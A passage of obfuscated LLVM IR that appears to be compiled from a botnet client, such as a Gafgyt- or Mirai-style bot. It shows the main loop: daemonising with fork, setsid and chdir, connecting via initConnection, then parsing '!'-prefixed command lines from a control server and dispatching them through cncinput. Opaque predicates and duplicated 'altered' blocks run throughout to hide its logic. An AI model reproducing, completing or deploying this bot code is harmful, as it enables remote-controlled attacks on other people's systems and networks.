  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart259, label %originalBB47alteredBB

originalBBpart259:                                ; preds = %originalBB47
  br label %169

; <label>:307:                                    ; preds = %169
  %308 = load i32, i32* %18, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i64 0, i64 %309
  store i8 0, i8* %310, align 1
  %311 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i32 0, i32 0
  call void @trim(i8* %311)
  %312 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i32 0, i32 0
  store i8* %312, i8** %22, align 8
  %313 = load i8*, i8** %22, align 8
  %314 = load i8, i8* %313, align 1
  %315 = zext i8 %314 to i32
  %316 = icmp eq i32 %315, 33
  br i1 %316, label %317, label %709

; <label>:317:                                    ; preds = %307
  %318 = load i8*, i8** %22, align 8
  %319 = getelementptr inbounds i8, i8* %318, i64 1
  store i8* %319, i8** %23, align 8
  br label %320

; <label>:320:                                    ; preds = %originalBBpart271, %317
  %321 = load i32, i32* @x.55
  %322 = load i32, i32* @y.56
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %320
  %329 = load i8*, i8** %23, align 8
  %330 = load i8, i8* %329, align 1
  %331 = zext i8 %330 to i32
  %332 = icmp ne i32 %331, 32
  %333 = load i32, i32* @x.55
  %334 = load i32, i32* @y.56
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %332, label %341, label %346

; <label>:341:                                    ; preds = %originalBBpart263
  %342 = load i8*, i8** %23, align 8
  %343 = load i8, i8* %342, align 1
  %344 = zext i8 %343 to i32
  %345 = icmp ne i32 %344, 0
  br label %346

; <label>:346:                                    ; preds = %341, %originalBBpart263
  %347 = phi i1 [ false, %originalBBpart263 ], [ %345, %341 ]
  %348 = load i32, i32* @x.55
  %349 = load i32, i32* @y.56
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %346
  %356 = load i32, i32* @x.55
  %357 = load i32, i32* @y.56
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %347, label %364, label %383

; <label>:364:                                    ; preds = %originalBBpart267
  %365 = load i32, i32* @x.55
  %366 = load i32, i32* @y.56
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %364
  %373 = load i8*, i8** %23, align 8
  %374 = getelementptr inbounds i8, i8* %373, i32 1
  store i8* %374, i8** %23, align 8
  %375 = load i32, i32* @x.55
  %376 = load i32, i32* @y.56
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %320

; <label>:383:                                    ; preds = %originalBBpart267
  %384 = load i32, i32* @x.55
  %385 = load i32, i32* @y.56
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %383
  %392 = load i8*, i8** %23, align 8
  %393 = load i8, i8* %392, align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 0
  %396 = load i32, i32* @x.55
  %397 = load i32, i32* @y.56
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %395, label %404, label %405

; <label>:404:                                    ; preds = %originalBBpart275
  br label %163

; <label>:405:                                    ; preds = %originalBBpart275
  %406 = load i8*, i8** %23, align 8
  store i8 0, i8* %406, align 1
  %407 = load i8*, i8** %22, align 8
  %408 = getelementptr inbounds i8, i8* %407, i64 1
  store i8* %408, i8** %23, align 8
  %409 = load i8*, i8** %22, align 8
  %410 = load i8*, i8** %23, align 8
  %411 = call i64 @strlen(i8* %410) #10
  %412 = getelementptr inbounds i8, i8* %409, i64 %411
  %413 = getelementptr inbounds i8, i8* %412, i64 2
  store i8* %413, i8** %22, align 8
  br label %414

; <label>:414:                                    ; preds = %originalBBpart296, %405
  %415 = load i32, i32* @x.55
  %416 = load i32, i32* @y.56
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %414
  %423 = load i8*, i8** %22, align 8
  %424 = load i8*, i8** %22, align 8
  %425 = call i64 @strlen(i8* %424) #10
  %426 = sub i64 %425, 1
  %427 = getelementptr inbounds i8, i8* %423, i64 %426
  %428 = load i8, i8* %427, align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 10
  %431 = load i32, i32* @x.55
  %432 = load i32, i32* @y.56
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart290, label %originalBB77alteredBB

originalBBpart290:                                ; preds = %originalBB77
  br i1 %430, label %448, label %439

; <label>:439:                                    ; preds = %originalBBpart290
  %440 = load i8*, i8** %22, align 8
  %441 = load i8*, i8** %22, align 8
  %442 = call i64 @strlen(i8* %441) #10
  %443 = sub i64 %442, 1
  %444 = getelementptr inbounds i8, i8* %440, i64 %443
  %445 = load i8, i8* %444, align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 13
  br label %448

; <label>:448:                                    ; preds = %439, %originalBBpart290
  %449 = phi i1 [ true, %originalBBpart290 ], [ %447, %439 ]
  br i1 %449, label %450, label %472

; <label>:450:                                    ; preds = %448
  %451 = load i32, i32* @x.55
  %452 = load i32, i32* @y.56
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %450
  %459 = load i8*, i8** %22, align 8
  %460 = load i8*, i8** %22, align 8
  %461 = call i64 @strlen(i8* %460) #10
  %462 = sub i64 %461, 1
  %463 = getelementptr inbounds i8, i8* %459, i64 %462
  store i8 0, i8* %463, align 1
  %464 = load i32, i32* @x.55
  %465 = load i32, i32* @y.56
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart296, label %originalBB92alteredBB

originalBBpart296:                                ; preds = %originalBB92
  br label %414

; <label>:472:                                    ; preds = %448
  %473 = load i8*, i8** %22, align 8
  store i8* %473, i8** %24, align 8
  br label %474

; <label>:474:                                    ; preds = %originalBBpart2100, %472
  %475 = load i8*, i8** %22, align 8
  %476 = load i8, i8* %475, align 1
  %477 = zext i8 %476 to i32
  %478 = icmp ne i32 %477, 32
  br i1 %478, label %479, label %484

; <label>:479:                                    ; preds = %474
  %480 = load i8*, i8** %22, align 8
  %481 = load i8, i8* %480, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp ne i32 %482, 0
  br label %484

; <label>:484:                                    ; preds = %479, %474
  %485 = phi i1 [ false, %474 ], [ %483, %479 ]
  br i1 %485, label %486, label %505

; <label>:486:                                    ; preds = %484
  %487 = load i32, i32* @x.55
  %488 = load i32, i32* @y.56
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %486
  %495 = load i8*, i8** %22, align 8
  %496 = getelementptr inbounds i8, i8* %495, i32 1
  store i8* %496, i8** %22, align 8
  %497 = load i32, i32* @x.55
  %498 = load i32, i32* @y.56
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %474

; <label>:505:                                    ; preds = %484
  %506 = load i32, i32* @x.55
  %507 = load i32, i32* @y.56
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %505
  %514 = load i8*, i8** %22, align 8
  store i8 0, i8* %514, align 1
  %515 = load i8*, i8** %22, align 8
  %516 = getelementptr inbounds i8, i8* %515, i32 1
  store i8* %516, i8** %22, align 8
  %517 = load i8*, i8** %24, align 8
  store i8* %517, i8** %25, align 8
  %518 = load i32, i32* @x.55
  %519 = load i32, i32* @y.56
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %526

; <label>:526:                                    ; preds = %originalBBpart2108, %originalBBpart2104
  %527 = load i8*, i8** %25, align 8
  %528 = load i8, i8* %527, align 1
  %529 = icmp ne i8 %528, 0
  br i1 %529, label %530, label %555

; <label>:530:                                    ; preds = %526
  %531 = load i32, i32* @x.55
  %532 = load i32, i32* @y.56
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %530
  %539 = load i8*, i8** %25, align 8
  %540 = load i8, i8* %539, align 1
  %541 = zext i8 %540 to i32
  %542 = call i32 @toupper(i32 %541) #10
  %543 = trunc i32 %542 to i8
  %544 = load i8*, i8** %25, align 8
  store i8 %543, i8* %544, align 1
  %545 = load i8*, i8** %25, align 8
  %546 = getelementptr inbounds i8, i8* %545, i32 1
  store i8* %546, i8** %25, align 8
  %547 = load i32, i32* @x.55
  %548 = load i32, i32* @y.56
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %526

; <label>:555:                                    ; preds = %526
  store i32 1, i32* %27, align 4
  %556 = load i8*, i8** %22, align 8
  %557 = call i8* @strtok(i8* %556, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %557, i8** %28, align 8
  %558 = load i8*, i8** %24, align 8
  %559 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 0
  store i8* %558, i8** %559, align 16
  br label %560

; <label>:560:                                    ; preds = %originalBBpart2142, %555
  %561 = load i32, i32* @x.55
  %562 = load i32, i32* @y.56
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %560
  %569 = load i8*, i8** %28, align 8
  %570 = icmp ne i8* %569, null
  %571 = load i32, i32* @x.55
  %572 = load i32, i32* @y.56
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %570, label %579, label %657

; <label>:579:                                    ; preds = %originalBBpart2112
  %580 = load i32, i32* @x.55
  %581 = load i32, i32* @y.56
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %579
  %588 = load i8*, i8** %28, align 8
  %589 = load i8, i8* %588, align 1
  %590 = zext i8 %589 to i32
  %591 = icmp ne i32 %590, 10
  %592 = load i32, i32* @x.55
  %593 = load i32, i32* @y.56
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %591, label %600, label %639

; <label>:600:                                    ; preds = %originalBBpart2116
  %601 = load i32, i32* @x.55
  %602 = load i32, i32* @y.56
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %600
  %609 = load i8*, i8** %28, align 8
  %610 = call i64 @strlen(i8* %609) #10
  %611 = add i64 %610, 1
  %612 = call noalias i8* @malloc(i64 %611) #6
  %613 = load i32, i32* %27, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %614
  store i8* %612, i8** %615, align 8
  %616 = load i32, i32* %27, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %617
  %619 = load i8*, i8** %618, align 8
  %620 = load i8*, i8** %28, align 8
  %621 = call i64 @strlen(i8* %620) #10
  %622 = add i64 %621, 1
  call void @llvm.memset.p0i8.i64(i8* %619, i8 0, i64 %622, i32 1, i1 false)
  %623 = load i32, i32* %27, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %624
  %626 = load i8*, i8** %625, align 8
  %627 = load i8*, i8** %28, align 8
  %628 = call i8* @strcpy(i8* %626, i8* %627) #6
  %629 = load i32, i32* %27, align 4
  %630 = add nsw i32 %629, 1
  store i32 %630, i32* %27, align 4
  %631 = load i32, i32* @x.55
  %632 = load i32, i32* @y.56
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBBpart2138, label %originalBB118alteredBB

originalBBpart2138:                               ; preds = %originalBB118
  br label %639

; <label>:639:                                    ; preds = %originalBBpart2138, %originalBBpart2116
  %640 = load i32, i32* @x.55
  %641 = load i32, i32* @y.56
  %642 = sub i32 %640, 1
  %643 = mul i32 %640, %642
  %644 = urem i32 %643, 2
  %645 = icmp eq i32 %644, 0
  %646 = icmp slt i32 %641, 10
  %647 = or i1 %645, %646
  br i1 %647, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %639
  %648 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %648, i8** %28, align 8
  %649 = load i32, i32* @x.55
  %650 = load i32, i32* @y.56
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %560

; <label>:657:                                    ; preds = %originalBBpart2112
  %658 = load i32, i32* %27, align 4
  %659 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i32 0, i32 0
  call void @cncinput(i32 %658, i8** %659)
  %660 = load i32, i32* %27, align 4
  %661 = icmp sgt i32 %660, 1
  br i1 %661, label %662, label %708

; <label>:662:                                    ; preds = %657
  store i32 1, i32* %29, align 4
  store i32 1, i32* %29, align 4
  br label %663

; <label>:663:                                    ; preds = %originalBBpart2150, %662
  %664 = load i32, i32* %29, align 4
  %665 = load i32, i32* %27, align 4
  %666 = icmp slt i32 %664, %665
  br i1 %666, label %667, label %691

; <label>:667:                                    ; preds = %663
  %668 = load i32, i32* %29, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %669
  %671 = load i8*, i8** %670, align 8
  call void @free(i8* %671) #6
  br label %672

; <label>:672:                                    ; preds = %667
  %673 = load i32, i32* @x.55
  %674 = load i32, i32* @y.56
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %672
  %681 = load i32, i32* %29, align 4
  %682 = add nsw i32 %681, 1
  store i32 %682, i32* %29, align 4
  %683 = load i32, i32* @x.55
  %684 = load i32, i32* @y.56
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart2150, label %originalBB144alteredBB

originalBBpart2150:                               ; preds = %originalBB144
  br label %663

; <label>:691:                                    ; preds = %663
  %692 = load i32, i32* @x.55
  %693 = load i32, i32* @y.56
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %691
  %700 = load i32, i32* @x.55
  %701 = load i32, i32* @y.56
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br label %708

; <label>:708:                                    ; preds = %originalBBpart2154, %657
  br label %709

; <label>:709:                                    ; preds = %708, %307
  br label %163

; <label>:710:                                    ; preds = %163
  %711 = load i32, i32* @x.55
  %712 = load i32, i32* @y.56
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %710
  %719 = load i32, i32* @x.55
  %720 = load i32, i32* @y.56
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %134
                                                  ; No predecessors!
  %728 = load i32, i32* @x.55
  %729 = load i32, i32* @y.56
  %730 = sub i32 %728, 1
  %731 = mul i32 %728, %730
  %732 = urem i32 %731, 2
  %733 = icmp eq i32 %732, 0
  %734 = icmp slt i32 %729, 10
  %735 = or i1 %733, %734
  br i1 %735, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %727
  %736 = load i32, i32* %11, align 4
  %737 = load i32, i32* @x.55
  %738 = load i32, i32* @y.56
  %739 = sub i32 %737, 1
  %740 = mul i32 %737, %739
  %741 = urem i32 %740, 2
  %742 = icmp eq i32 %741, 0
  %743 = icmp slt i32 %738, 10
  %744 = or i1 %742, %743
  br i1 %744, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  ret i32 %736

originalBBalteredBB:                              ; preds = %originalBB, %2
  %745 = alloca i32, align 4
  %746 = alloca i32, align 4
  %747 = alloca i8**, align 8
  %748 = alloca i32, align 4
  %749 = alloca i32, align 4
  %750 = alloca i32, align 4
  %751 = alloca [4096 x i8], align 16
  %752 = alloca i32, align 4
  %753 = alloca i32, align 4
  %754 = alloca i32*, align 8
  %755 = alloca i32, align 4
  %756 = alloca i8*, align 8
  %757 = alloca i8*, align 8
  %758 = alloca i8*, align 8
  %759 = alloca i8*, align 8
  %760 = alloca [10 x i8*], align 16
  %761 = alloca i32, align 4
  %762 = alloca i8*, align 8
  %763 = alloca i32, align 4
  store i32 0, i32* %745, align 4
  store i32 %0, i32* %746, align 4
  store i8** %1, i8*** %747, align 8
  %764 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %765 = call i32 @getpid() #6
  %_ = sub i32 0, %764
  %gen = add i32 %_, %765
  %_1 = sub i32 0, %764
  %gen2 = add i32 %_1, %765
  %_3 = shl i32 %764, %765
  %_4 = sub i32 %764, %765
  %gen5 = mul i32 %_4, %765
  %766 = xor i32 %764, %765
  call void @srand(i32 %766) #6
  %767 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %768 = call i32 @getpid() #6
  %769 = xor i32 %767, %768
  call void @init_rand(i32 %769)
  %770 = call i32 @getOurIP()
  %771 = call i32 @fork() #6
  store i32 %771, i32* %748, align 4
  %772 = icmp ne i32 %771, 0
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %57
  %773 = load i32, i32* %15, align 4
  %774 = icmp ne i32 %773, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %76
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %97
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %114
  %775 = call i32 @setsid() #6
  %776 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0)) #6
  %777 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %134
  %778 = call i32 @initConnection()
  %779 = icmp ne i32 %778, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %182
  %780 = load i32, i32* %19, align 4
  %781 = add nsw i32 %780, 1
  store i32 %781, i32* %21, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %206
  %782 = load i32*, i32** @pids, align 8
  %783 = load i32, i32* %21, align 4
  %784 = zext i32 %783 to i64
  %785 = getelementptr inbounds i32, i32* %782, i64 %784
  %786 = load i32, i32* %785, align 4
  %787 = load i32*, i32** @pids, align 8
  %788 = load i32, i32* %21, align 4
  %_31 = shl i32 %788, 1
  %_32 = shl i32 %788, 1
  %_33 = sub i32 0, %788
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %788, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 %788, 1
  %gen38 = mul i32 %_37, 1
  %_39 = shl i32 %788, 1
  %789 = sub i32 %788, 1
  %790 = zext i32 %789 to i64
  %791 = getelementptr inbounds i32, i32* %787, i64 %790
  store i32 %786, i32* %791, align 4
  br label %originalBB30

originalBB43alteredBB:                            ; preds = %originalBB43, %254
  %792 = load i32*, i32** @pids, align 8
  %793 = load i32, i32* %21, align 4
  %794 = zext i32 %793 to i64
  %795 = getelementptr inbounds i32, i32* %792, i64 %794
  %796 = load i32, i32* %795, align 4
  %797 = load i32*, i32** %20, align 8
  %798 = load i32, i32* %21, align 4
  %799 = zext i32 %798 to i64
  %800 = getelementptr inbounds i32, i32* %797, i64 %799
  store i32 %796, i32* %800, align 4
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %288
  %801 = load i32, i32* %19, align 4
  %_48 = sub i32 0, %801
  %gen49 = add i32 %_48, 1
  %_50 = sub i32 %801, 1
  %gen51 = mul i32 %_50, 1
  %_52 = sub i32 %801, 1
  %gen53 = mul i32 %_52, 1
  %_54 = sub i32 0, %801
  %gen55 = add i32 %_54, 1
  %_56 = sub i32 %801, 1
  %gen57 = mul i32 %_56, 1
  %802 = add nsw i32 %801, 1
  store i32 %802, i32* %19, align 4
  br label %originalBB47

originalBB61alteredBB:                            ; preds = %originalBB61, %320
  %803 = load i8*, i8** %23, align 8
  %804 = load i8, i8* %803, align 1
  %805 = zext i8 %804 to i32
  %806 = icmp ne i32 %805, 32
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %346
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %364
  %807 = load i8*, i8** %23, align 8
  %808 = getelementptr inbounds i8, i8* %807, i32 1
  store i8* %808, i8** %23, align 8
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %383
  %809 = load i8*, i8** %23, align 8
  %810 = load i8, i8* %809, align 1
  %811 = zext i8 %810 to i32
  %812 = icmp eq i32 %811, 0
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %414
  %813 = load i8*, i8** %22, align 8
  %814 = load i8*, i8** %22, align 8
  %815 = call i64 @strlen(i8* %814) #10
  %_78 = shl i64 %815, 1
  %_79 = sub i64 %815, 1
  %gen80 = mul i64 %_79, 1
  %_81 = shl i64 %815, 1
  %_82 = shl i64 %815, 1
  %_83 = sub i64 %815, 1
  %gen84 = mul i64 %_83, 1
  %_85 = shl i64 %815, 1
  %_86 = shl i64 %815, 1
  %_87 = sub i64 %815, 1
  %gen88 = mul i64 %_87, 1
  %816 = sub i64 %815, 1
  %817 = getelementptr inbounds i8, i8* %813, i64 %816
  %818 = load i8, i8* %817, align 1
  %819 = zext i8 %818 to i32
  %820 = icmp eq i32 %819, 10
  br label %originalBB77

originalBB92alteredBB:                            ; preds = %originalBB92, %450
  %821 = load i8*, i8** %22, align 8
  %822 = load i8*, i8** %22, align 8
  %823 = call i64 @strlen(i8* %822) #10
  %_93 = sub i64 %823, 1
  %gen94 = mul i64 %_93, 1
  %824 = sub i64 %823, 1
  %825 = getelementptr inbounds i8, i8* %821, i64 %824
  store i8 0, i8* %825, align 1
  br label %originalBB92

originalBB98alteredBB:                            ; preds = %originalBB98, %486
  %826 = load i8*, i8** %22, align 8
  %827 = getelementptr inbounds i8, i8* %826, i32 1
  store i8* %827, i8** %22, align 8
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %505
  %828 = load i8*, i8** %22, align 8
  store i8 0, i8* %828, align 1
  %829 = load i8*, i8** %22, align 8
  %830 = getelementptr inbounds i8, i8* %829, i32 1
  store i8* %830, i8** %22, align 8
  %831 = load i8*, i8** %24, align 8
  store i8* %831, i8** %25, align 8
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %530
  %832 = load i8*, i8** %25, align 8
  %833 = load i8, i8* %832, align 1
  %834 = zext i8 %833 to i32
  %835 = call i32 @toupper(i32 %834) #10
  %836 = trunc i32 %835 to i8
  %837 = load i8*, i8** %25, align 8
  store i8 %836, i8* %837, align 1
  %838 = load i8*, i8** %25, align 8
  %839 = getelementptr inbounds i8, i8* %838, i32 1
  store i8* %839, i8** %25, align 8
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %560
